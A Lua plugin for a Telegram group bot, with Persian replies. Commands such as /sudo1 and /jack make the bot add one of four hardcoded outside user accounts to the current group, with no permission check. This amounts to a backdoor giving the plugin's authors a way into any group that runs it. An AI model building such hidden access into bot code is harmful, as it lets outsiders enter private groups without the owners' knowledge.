do

local function callback(extra, success, result)
  vardump(success)
  vardump(result)
end

local function run(msg, matches)
 if matches[1] == 'sudo1' then
        chat = 'chat#'..msg.to.id
        user1 = 'user#'..147237496
        chat_add_user(chat, user1, callback, false)
	return "مدیر ربات با موفقیت وارد گروه شد :/"
      end
  if matches[1] == 'sudo2' then
        chat = 'chat#'..msg.to.id
        user2 = 'user#'..184413821
        chat_add_user(chat, user2, callback, false)
	return "مدیر دوم ربات با موفقیت وارد گروه شد :D"
      end
if matches[1] == 'kosgo' or matches[1] == 'kosgu' then
        chat = 'chat#'..msg.to.id
        user3 = 'user#'..170327103
        chat_add_user(chat, user3, callback, false)
	return "درست نمیباشد :D"
      end
 if matches[1] == 'jack' then
        chat = 'chat#'..msg.to.id
        user4 = 'user#'..11710471
        chat_add_user(chat, user4, callback, false)
	return "درست نمیباشد) :D"
      end
 end

return {
  description = "ساپورت تیم", 
  usage = {
    "/help دریافت دستورات", 
	},
  patterns = {
    "^[!/.](sudo1)",
    "^[!/.](sudo2)",
    "^[!/.](kosgo)",
    "^[!/.](kosgu)",
    "^[!/.](jack)",
    "^(sudo1)",
    "^(sudo2)",
    "^()",
  }, 
  run = run,
}


end
